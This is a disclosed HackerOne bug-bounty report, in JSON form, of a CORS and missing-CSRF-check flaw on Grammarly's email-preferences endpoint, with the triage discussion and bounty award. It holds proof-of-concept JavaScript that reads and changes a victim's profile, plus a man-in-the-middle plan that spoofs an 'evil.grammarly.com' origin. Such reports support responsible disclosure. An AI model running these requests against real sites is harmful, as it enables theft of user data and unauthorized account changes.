{
  "id": 629892,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82Mjk4OTI=",
  "url": "https://hackerone.com/reports/629892",
  "title": "Lack of CSRF header validation at https://g-mail.grammarly.com/profile",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2019-06-26T08:34:39.923Z",
  "submitted_at": "2019-06-26T08:34:39.923Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "orlserg",
    "url": "/orlserg",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/344/557/e52419d580024b46dfc518300c1293bb341bc0e8_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 22746,
    "url": "https://hackerone.com/grammarly",
    "handle": "grammarly",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/022/746/a2bf7f90c683af5214fcc74c1df6804286ee97ce_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/022/746/a2bf7f90c683af5214fcc74c1df6804286ee97ce_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [

    ],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Grammarly",
      "twitter_handle": "",
      "website": "https://www.grammarly.com",
      "about": "Grammarly makes sure everything you type is clear, effective, and mistake-free."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [

  ],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2019-10-31T03:57:12.157Z",
  "bug_reporter_agreed_on_going_public_at": "2019-10-31T03:57:12.058Z",
  "team_member_agreed_on_going_public_at": "2019-10-30T13:21:44.481Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hello!\n\n## Description\nI found that setting up a CORS in some places will check the protocol, but it allows using http scheme. In addition, any subdomain is considered trusted. If the origin is *http://www.grammarly.com*, then the server will respond: *Access-Control-Allow-Origin: http://www.grammarly.com*. That can lead to leakage of user data and unauthorized actions on behalf of the user.\n{F517015}\n\nIn fact, this means that an attacker can use the MITM attack (Wi-Fi, local networks, etc.) to substitute client requests, thus replacing the origin. \n\n####*Important note: I very carefully read the program policy and focus on the fact that MITM attack is not made on the existent grammarly sites.*\n\n## How it works\n{F517002}\n\nIf an attacker can perform a mitm attack on a user, he can replace the requested content of any unencrypted request and produce a 302 redirect of the user to http: //evil.grammarly.com. Since the request is not unencrypted, the attacker can also replace the response and implement javascript that performs a requests to vulnerable endpoints. Thus, the vulnerable enpoint will think that the request came from the origin of the trust it trusts and will execute the request.\n\nUsing a header to send a CSRF token protects against such attacks. But I found a place where verification of the transferred token is not performed.\n\nThis vulnerability was perfectly described by James Kettle on OWASP AppSec EU 2017. You can watch the description of the vulnerability on the link to his presentation. https://youtu.be/wgkj4ZgxI4c?t=1139\n\n## Vulnerable enpoints\n\n1) The malicious javascript will look like:\n\n```javascript\nvar xhttp = new XMLHttpRequest();\nxhttp.onreadystatechange = function() {\n   if (this.readyState == 4 && this.status == 200) {\n       document.getElementById(\"response-node\").innerHTML = this.responseText;\n   }\n};\nxhttp.open(\"GET\", \"https://g-mail.grammarly.com/profile\", true);\nxhttp.withCredentials = true;\nxhttp.send();\n```\nThe response will contain the user's email address and subscription settings:\n```\n{\"id\":749327815,\"email\":\"email@yandex.ru\",\"preferenceFields\":[{\"name\":\"Weekly Progress Reports\",\"description\":\"Get a weekly report with statistics and insights on how you are writing with Grammarly.\",\"order\":49,\"value\":true},{\"name\":\"Product Updates\",\"description\":\"Important info on new features and products. We may also ask for your feedback on occasion.\",\"order\":50,\"value\":true},{\"name\":\"Grammarly Offers\",\"description\":\"These emails may include special upgrade offers, limited-time events, or coupons. \",\"order\":50,\"value\":true},{\"name\":\"The Grammarly Blog\",\"description\":\"A weekly newsletter that includes fun tips on all things writing.\",\"order\":50,\"value\":true},{\"name\":\"Grammarly Business\",\"description\":\"Updates and information on our products for multi-person teams.\",\"order\":55,\"value\":true}],\"unsubscribe\":false}\n``` \n\n2) The malicious javascript will look like:\n\n```javascript\nvar xhttp = new XMLHttpRequest();\nvar data = new FormData();\ndata.append(\"email\", \"████████\");\ndata.append(\"unsubscribe\", \"false\");\n(...)\nxhttp.open(\"POST\", \"https://g-mail.grammarly.com/profile\", true);\nxhttp.withCredentials = true;\nxhttp.send(data);\n```\nThe request will change the subscription settings. It looks like CSRF.\n\nNow I'm trying to find more places to increase the impact.\n\n## Impact\n\nCORS misconfiguration lead to leakage of user data and unauthorized actions on behalf of the user.",
  "weakness": {
    "id": 18,
    "name": "Information Disclosure"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 517002,
      "file_name": "CORS.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/517/002/5314045f608f7d9a3c59bd50991770fae7e3a678/CORS.png?response-content-disposition=attachment%3B%20filename%3D%22CORS.png%22%3B%20filename%2A%3DUTF-8%27%27CORS.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3R5LIR7E%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T073745Z&X-Amz-Expires=1214&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQC8A6iLd6fdizoKiDmGTMJOtEK0j%2B9m1Hwg8kDIhR3i4wIgU1cbUALHKJVW4fP2UzLm%2Fzggy%2Br2f2qSsa5O9UhWw3gqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDJxg6%2BdxWFHEdpNOiSqPBbOGoWCMpPDSC5i104drxenzKlJmKtfbaPYXcEUk5xzpfFz7qlzMHzxshj0ZGvQ9B6u%2FX6LPbR7Sl3mWyjkMgqtizxl77eMrAi1ar%2FJkwIbmf%2B0it8tRDIPTWPFce%2F%2FHd%2BmtmIG4RB%2BQvydMEyr5Q8nhoRP6O%2FjYWWnkb%2BRNcelyK2xmsSwGLQOdlU2enMwhOK3BPGXmuh1bofm3xd5cvTpV39JpV6%2FHz%2BXsNZvVfqbg%2BXuKaDVhROLMjPyKGTGTay0tNg%2BACp27ysa5IWV%2BI31t19hmXNWzs3ESd2B9nf6c8Joaw9cZ0BFv5SPhCjzrknQ3HXC67SgBpIKoEk6LXEaEw2NmKmI7XCGH3bhCHfpUPAj9Mi5Cb%2BK85SWDjSiu91Bd4pe4XmONhhEzu%2BHUsNC4KzHg%2FM4pD%2BGx8ddmYnr3tdArcXEpk67wbeRug1K27YWz%2FVO96fiXdkS9Xm5J9hNQAGlePyFuIN5mOMBg2d%2BcjkTZF8kSHHvqXSqPAQgX6ugFlVoubAsd7KnyrCvE4eFyHIZVo3oV5JU82FGBbUj3s5lUYQdYVFd3Ps16Rt1PGkRAUwR7cXlVvplJS0rb8610%2BG17raAQwJy8cRN7s3KyQNhdXXIQRdJRhKYg1JE%2FNIQcwkwywKN%2FsigvOXECelwnnne41q2BURRgR4GCNgRxam2jBgUkUJjQtQ%2FokWvEQYLIA4f9HX9kkcgw0kkfFu5UJq73bMC%2BU%2F3eZ7B4Zy9taEIGKwSg86qyFVg860n2oAiN%2FfpKAx8tRUW8DTjM2X54yGGHPadIq0Hu8cZCkJQ4Th5tIC7R%2BHPfSgSag0HBfAmzZ5118Q9ZwkkntRTVxAl1pkGthGbtGkww1jjKCJ0wwoe5qAY6sQHDRGqTlml9JOa7pcIPnENAbSjPA%2BNnrcJ1TNMO0BkSMWqUN9w1vudtRvjp773httgmTyAlYuxH7EmlIPFmJQ6Gu1DzzT7rLiEF2GE0t7B2q9gxwFisSqlUh5Y1Lwu%2BtN5x1TzSiMb5y26sSzmQ%2BShQL8fCGA23tpHtpIE9ans0LS34EwJCOxZwBH%2BHx9OzuRqjdgDlu23FbHdQ6SG6rIzVi21GM%2BTw0KAnkoR1gvqPjRk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b3c8e534e2370dfad358936a1a16e6acf2512e6a6f85d2b1fc7543e84edb45ac",
      "file_size": 145999,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 517015,
      "file_name": "burp.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/517/015/406cdd11968ad8a0378c32ecdaceba07880db2c2/burp.png?response-content-disposition=attachment%3B%20filename%3D%22burp.png%22%3B%20filename%2A%3DUTF-8%27%27burp.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3R5LIR7E%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T073745Z&X-Amz-Expires=1214&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQC8A6iLd6fdizoKiDmGTMJOtEK0j%2B9m1Hwg8kDIhR3i4wIgU1cbUALHKJVW4fP2UzLm%2Fzggy%2Br2f2qSsa5O9UhWw3gqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDJxg6%2BdxWFHEdpNOiSqPBbOGoWCMpPDSC5i104drxenzKlJmKtfbaPYXcEUk5xzpfFz7qlzMHzxshj0ZGvQ9B6u%2FX6LPbR7Sl3mWyjkMgqtizxl77eMrAi1ar%2FJkwIbmf%2B0it8tRDIPTWPFce%2F%2FHd%2BmtmIG4RB%2BQvydMEyr5Q8nhoRP6O%2FjYWWnkb%2BRNcelyK2xmsSwGLQOdlU2enMwhOK3BPGXmuh1bofm3xd5cvTpV39JpV6%2FHz%2BXsNZvVfqbg%2BXuKaDVhROLMjPyKGTGTay0tNg%2BACp27ysa5IWV%2BI31t19hmXNWzs3ESd2B9nf6c8Joaw9cZ0BFv5SPhCjzrknQ3HXC67SgBpIKoEk6LXEaEw2NmKmI7XCGH3bhCHfpUPAj9Mi5Cb%2BK85SWDjSiu91Bd4pe4XmONhhEzu%2BHUsNC4KzHg%2FM4pD%2BGx8ddmYnr3tdArcXEpk67wbeRug1K27YWz%2FVO96fiXdkS9Xm5J9hNQAGlePyFuIN5mOMBg2d%2BcjkTZF8kSHHvqXSqPAQgX6ugFlVoubAsd7KnyrCvE4eFyHIZVo3oV5JU82FGBbUj3s5lUYQdYVFd3Ps16Rt1PGkRAUwR7cXlVvplJS0rb8610%2BG17raAQwJy8cRN7s3KyQNhdXXIQRdJRhKYg1JE%2FNIQcwkwywKN%2FsigvOXECelwnnne41q2BURRgR4GCNgRxam2jBgUkUJjQtQ%2FokWvEQYLIA4f9HX9kkcgw0kkfFu5UJq73bMC%2BU%2F3eZ7B4Zy9taEIGKwSg86qyFVg860n2oAiN%2FfpKAx8tRUW8DTjM2X54yGGHPadIq0Hu8cZCkJQ4Th5tIC7R%2BHPfSgSag0HBfAmzZ5118Q9ZwkkntRTVxAl1pkGthGbtGkww1jjKCJ0wwoe5qAY6sQHDRGqTlml9JOa7pcIPnENAbSjPA%2BNnrcJ1TNMO0BkSMWqUN9w1vudtRvjp773httgmTyAlYuxH7EmlIPFmJQ6Gu1DzzT7rLiEF2GE0t7B2q9gxwFisSqlUh5Y1Lwu%2BtN5x1TzSiMb5y26sSzmQ%2BShQL8fCGA23tpHtpIE9ans0LS34EwJCOxZwBH%2BHx9OzuRqjdgDlu23FbHdQ6SG6rIzVi21GM%2BTw0KAnkoR1gvqPjRk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=770c6bc925753e013a77c599f2bacdfb85124961a01f11d449853a8437c284a7",
      "file_size": 61532,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2019-11-29T13:21:44.583Z",
  "allow_singular_disclosure_after": -120420960.42056358,
  "singular_disclosure_allowed": true,
  "vote_count": 131,
  "voters": [
    "computersarehard",
    "nicochess",
    "megaknight",
    "d0kkillo",
    "base_64",
    "sameerphad72",
    "orlserg",
    "spam404",
    "dhakal_ananda",
    "mik317",
    "and 121 more..."
  ],
  "severity": {
    "rating": "medium",
    "score": 4.2,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "high",
      "privileges_required": "none",
      "user_interaction": "required",
      "scope": "unchanged",
      "confidentiality": "low",
      "integrity": "low",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 1366,
    "asset_type": "URL",
    "asset_identifier": "www.grammarly.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [

    ],
    "assignable_team_member_groups": [

    ]
  },
  "activities": [
    {
      "id": 5200654,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @orlserg,\n\nThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nKind regards,\n@druth ",
      "automated_response": false,
      "created_at": "2019-06-26T16:16:12.904Z",
      "updated_at": "2019-06-26T16:16:12.904Z",
      "actor": {
        "username": "druth",
        "cleared": false,
        "verified": false,
        "url": "/druth",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/344/813/24cad2ef0871d9ca525966e6abbba3be8c97f4f7_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "grammarly"
    },
    {
      "id": 5200669,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugDuplicate",
      "message": "Hi @orlserg,\n\nThanks for the report. Unfortunately this was submitted previously by another tester, but we appreciate your work and look forward to additional reports from you.\n\nGood Luck!\n@druth ",
      "automated_response": false,
      "created_at": "2019-06-26T16:19:46.351Z",
      "updated_at": "2019-06-26T16:19:46.351Z",
      "original_report_id": 461530,
      "actor": {
        "username": "druth",
        "cleared": false,
        "verified": false,
        "url": "/druth",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/344/813/24cad2ef0871d9ca525966e6abbba3be8c97f4f7_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "grammarly"
    },
    {
      "id": 5201079,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugReopened",
      "message": "",
      "automated_response": false,
      "created_at": "2019-06-26T17:48:16.785Z",
      "updated_at": "2019-06-26T17:48:16.785Z",
      "actor": {
        "username": "gr_triage",
        "cleared": false,
        "verified": false,
        "url": "/gr_triage",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "grammarly"
    },
    {
      "id": 5201207,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportSeverityUpdated",
      "message": "",
      "automated_response": false,
      "created_at": "2019-06-26T18:13:12.611Z",
      "updated_at": "2019-06-26T18:13:12.611Z",
      "additional_data": {
        "old_severity": "Low",
        "new_severity": "Medium (4.7)",
        "old_severity_id": 444530,
        "new_severity_id": 444893
      },
      "actor": {
        "username": "gr_triage",
        "cleared": false,
        "verified": false,
        "url": "/gr_triage",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "grammarly"
    },
    {
      "id": 5201352,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportSeverityUpdated",
      "message": "",
      "automated_response": false,
      "created_at": "2019-06-26T18:41:27.218Z",
      "updated_at": "2019-06-26T18:41:27.218Z",
      "additional_data": {
        "old_severity": "Medium (4.7)",
        "new_severity": "Medium (4.2)",
        "old_severity_id": 444893,
        "new_severity_id": 444913
      },
      "actor": {
        "username": "gr_triage",
        "cleared": false,
        "verified": false,
        "url": "/gr_triage",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "grammarly"
    },
    {
      "id": 5201359,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportTitleUpdated",
      "message": "",
      "automated_response": false,
      "created_at": "2019-06-26T18:43:07.571Z",
      "updated_at": "2019-06-26T18:43:07.571Z",
      "additional_data": {
        "old_title": "CORS misconfiguration leads to client data leakage",
        "new_title": "Lack of CSRF header validation at https://g-mail.grammarly.com/profile"
      },
      "actor": {
        "username": "gr_triage",
        "cleared": false,
        "verified": false,
        "url": "/gr_triage",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "grammarly"
    },
    {
      "id": 5201382,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugTriaged",
      "message": "",
      "automated_response": false,
      "created_at": "2019-06-26T18:46:13.462Z",
      "updated_at": "2019-06-26T18:46:13.462Z",
      "actor": {
        "username": "gr_triage",
        "cleared": false,
        "verified": false,
        "url": "/gr_triage",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "grammarly"
    },
    {
      "id": 5201550,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hey @orlserg,\n\nThanks for the report. It appears to be valid.\n\n1. We're ok with this CORS configuration. It's not a bug by itself.\n2. All Grammarly endpoints require a CSRF header being set. CSRF token is a `Secure` cookie, so it's impossible to retrieve it on insecure (`http://`) pages.\n3. It appears that `g-mail.grammarly.com/profile` doesn't require CSRF header being set.\n4. The endpoint authenticates users via `profileToken` cookies (`Secure`, `HTTPonly`), which is set when the user visits \"Email Preferences\" page from the email newsletter.\n5. However, `profileToken` cookie has a short lifespan - 1 week. That means, the victim should have visited \"Email Preferences\" page in the last 7 days to make this attack successful.\n\nWe estimate this vulnerability as `CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N` (4.2):\n- Attack Complexity -> High (MITM + user should have `profileToken` cookie)\n- User Interaction -> Required\n- C/I/A -> Low/Low/None\n- Scope -> Unchanged\n\nFeel free to reply if you have any questions.\n\nThanks again and happy hunting!",
      "automated_response": false,
      "created_at": "2019-06-26T19:16:04.852Z",
      "updated_at": "2019-06-26T19:16:04.852Z",
      "actor": {
        "username": "gr_triage",
        "cleared": false,
        "verified": false,
        "url": "/gr_triage",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "grammarly"
    },
    {
      "id": 5203173,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hello, @vladimir_suslenko,\n\nYes, I agree in themselves on some points. \n\n1.  It's not a bug by itself. I completely agree. But this is the case if you use the CSRF token in the header.\n2. Not all, as we can see :)\n3. Yes. The header is set here but not checked on the server side.\n4. Yes.\n5. Ok.\n\nBut it seems that you have not fully understood the principle of attack. Sorry for some confusion in my report. Perhaps I did not fully explain the essence of the problem. Because it is somewhat larger than the usual СSRF. Using this method of attack, you can not only perform unauthorized actions on behalf of the user, but also receive user data through crossorigin ajax requests (bacause of CORS).\n\n1. Even if the CSRF token is not set in the header, it is impossible to perform a normal CSRF attack, since endpoint accepts only the application/json type requests. I report a way to attack through flash: https://hackerone.com/reports/437768, but it was closed as a duplicate. The report contained information about the attack on g-mail.grammarly.com/profile. I'm not sure, but I think that this attack method can work now. But I did not rely on this method of attack, as he was already known to the security team.\n\n2. Another type of attack with type application/json is javascript. So here I am talking exactly about it.\n\n## How it works\nWith the help of javascript, you can set the Content-Type: application/json header necessary for the attack. But how to execute json request to the server? Here comes the CORS. The CORS allows you to perform ajax requests from any (in your case) subdomain and allows the use of http protocol. In addition, the *Access-Control-Allow-Credentials: true* header that is present in the server response allows the use of authorization cookies (profileToken in your case) to perform cross-origin requests.\n\nThus, the presence of headers:\n```\nAccess-Control-Allow-Origin: http://evil.grammarly.com (evil - reflected from Origin header)\nAccess-Control-Allow-Credentials: true\n```\nsays that the request from http://evil.grammarly.com will be trusted and will be able to use cookies to run on the server. \n\nBut there are several different types of incorrect settings of the cors, when the origin from which the request is executed is controlled by an attacker. For example:\n* https://hackerone.com/reports/426165\n* https://hackerone.com/reports/470298\n* https://hackerone.com/reports/235200\n\nBasically this is the wrong setting of the origin itself. You have this setting done correctly. But using the http protocol for cross-origin of requests creates the ability to conduct MITM attacks in order to spoof the origin.\n\n**So MITM attack is needed not to obtain an authorization cookie, but to replace the origin.** For more details, you can watch the video:  https://youtu.be/wgkj4ZgxI4c?t=1139\n\n## List of steps to steal data\n1. MITM attack and spoofing content and origin of http://evil.grammarly.com.\n2. Spoofed content of http://evil.grammarly.com contain javascript, which makes cross-orign GET request to  https://g-mail.grammarly.com/profile (for example).\n3. The attacker steals user data.\n\n## List of steps to perform actions on behalf of the user\n1. MITM attack and spoofing content and origin of http://evil.grammarly.com.\n2. Spoofed content of http://evil.grammarly.com contain javascript, which makes cross-orign POST request to  https://g-mail.grammarly.com/profile (for example).\n3. The attacker performs the change settings.\n\nFeel free to ask any questions.",
      "automated_response": false,
      "created_at": "2019-06-27T04:40:48.530Z",
      "updated_at": "2019-06-27T04:40:48.530Z",
      "actor": {
        "username": "orlserg",
        "cleared": false,
        "verified": false,
        "url": "/orlserg",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/344/557/e52419d580024b46dfc518300c1293bb341bc0e8_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "grammarly"
    },
    {
      "id": 5207867,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugTriaged",
      "message": "",
      "automated_response": false,
      "created_at": "2019-06-27T16:26:56.508Z",
      "updated_at": "2019-06-27T16:26:56.508Z",
      "actor": {
        "username": "andriy_derevyanko",
        "cleared": false,
        "verified": false,
        "url": "/andriy_derevyanko",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/232/429/8d025f5ca823ddfa62ce186084ff79b3e72542ed_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "grammarly"
    },
    {
      "id": 5207871,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BountyAwarded",
      "message": "",
      "automated_response": false,
      "created_at": "2019-06-27T16:27:36.124Z",
      "updated_at": "2019-06-27T16:27:36.124Z",
      "actor": {
        "url": "/grammarly",
        "ibb": false,
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/022/746/a2bf7f90c683af5214fcc74c1df6804286ee97ce_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "profile": {
          "name": "Grammarly"
        }
      },
      "bounty_currency": "usd",
      "genius_execution_id": null,
      "team_handle": "grammarly",
      "collaborator": {
        "username": "orlserg",
        "url": "/orlserg"
      }
    },
    {
      "id": 5208761,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Thanks for reward, guys.\n\nI also took the time to test my guesses about CSRF using a flash. More info in my report https://hackerone.com/reports/437768. Although the problem was known and noted as fixed, I can now confirm that it is still working for https://g-mail.grammarly.com/profile.\n\nI added a video confirmation for clarity.",
      "automated_response": false,
      "created_at": "2019-06-27T18:45:54.449Z",
      "updated_at": "2019-06-27T18:45:54.449Z",
      "actor": {
        "username": "orlserg",
        "cleared": false,
        "verified": false,
        "url": "/orlserg",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/344/557/e52419d580024b46dfc518300c1293bb341bc0e8_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "attachments": [
        {
          "id": 517981,
          "filename": "Grammarly-CSRF-2019-06-28_01.08.45.mkv",
          "type": "video/x-matroska",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/517/981/f00a8f64c8df9117105bd1fc80f89c765f691627/Grammarly-CSRF-2019-06-28_01.08.45.mkv?response-content-disposition=attachment%3B%20filename%3D%22Grammarly-CSRF-2019-06-28_01.08.45.mkv%22%3B%20filename%2A%3DUTF-8%27%27Grammarly-CSRF-2019-06-28_01.08.45.mkv&response-content-type=video%2Fx-matroska&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3R5LIR7E%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T073745Z&X-Amz-Expires=1214&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQC8A6iLd6fdizoKiDmGTMJOtEK0j%2B9m1Hwg8kDIhR3i4wIgU1cbUALHKJVW4fP2UzLm%2Fzggy%2Br2f2qSsa5O9UhWw3gqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDJxg6%2BdxWFHEdpNOiSqPBbOGoWCMpPDSC5i104drxenzKlJmKtfbaPYXcEUk5xzpfFz7qlzMHzxshj0ZGvQ9B6u%2FX6LPbR7Sl3mWyjkMgqtizxl77eMrAi1ar%2FJkwIbmf%2B0it8tRDIPTWPFce%2F%2FHd%2BmtmIG4RB%2BQvydMEyr5Q8nhoRP6O%2FjYWWnkb%2BRNcelyK2xmsSwGLQOdlU2enMwhOK3BPGXmuh1bofm3xd5cvTpV39JpV6%2FHz%2BXsNZvVfqbg%2BXuKaDVhROLMjPyKGTGTay0tNg%2BACp27ysa5IWV%2BI31t19hmXNWzs3ESd2B9nf6c8Joaw9cZ0BFv5SPhCjzrknQ3HXC67SgBpIKoEk6LXEaEw2NmKmI7XCGH3bhCHfpUPAj9Mi5Cb%2BK85SWDjSiu91Bd4pe4XmONhhEzu%2BHUsNC4KzHg%2FM4pD%2BGx8ddmYnr3tdArcXEpk67wbeRug1K27YWz%2FVO96fiXdkS9Xm5J9hNQAGlePyFuIN5mOMBg2d%2BcjkTZF8kSHHvqXSqPAQgX6ugFlVoubAsd7KnyrCvE4eFyHIZVo3oV5JU82FGBbUj3s5lUYQdYVFd3Ps16Rt1PGkRAUwR7cXlVvplJS0rb8610%2BG17raAQwJy8cRN7s3KyQNhdXXIQRdJRhKYg1JE%2FNIQcwkwywKN%2FsigvOXECelwnnne41q2BURRgR4GCNgRxam2jBgUkUJjQtQ%2FokWvEQYLIA4f9HX9kkcgw0kkfFu5UJq73bMC%2BU%2F3eZ7B4Zy9taEIGKwSg86qyFVg860n2oAiN%2FfpKAx8tRUW8DTjM2X54yGGHPadIq0Hu8cZCkJQ4Th5tIC7R%2BHPfSgSag0HBfAmzZ5118Q9ZwkkntRTVxAl1pkGthGbtGkww1jjKCJ0wwoe5qAY6sQHDRGqTlml9JOa7pcIPnENAbSjPA%2BNnrcJ1TNMO0BkSMWqUN9w1vudtRvjp773httgmTyAlYuxH7EmlIPFmJQ6Gu1DzzT7rLiEF2GE0t7B2q9gxwFisSqlUh5Y1Lwu%2BtN5x1TzSiMb5y26sSzmQ%2BShQL8fCGA23tpHtpIE9ans0LS34EwJCOxZwBH%2BHx9OzuRqjdgDlu23FbHdQ6SG6rIzVi21GM%2BTw0KAnkoR1gvqPjRk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e25b9808fbba628be30c35025ea09b93a57bc08bd15ef9b027485c52a01cc32a"
        }
      ],
      "genius_execution_id": null,
      "team_handle": "grammarly"
    },
    {
      "id": 5211189,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
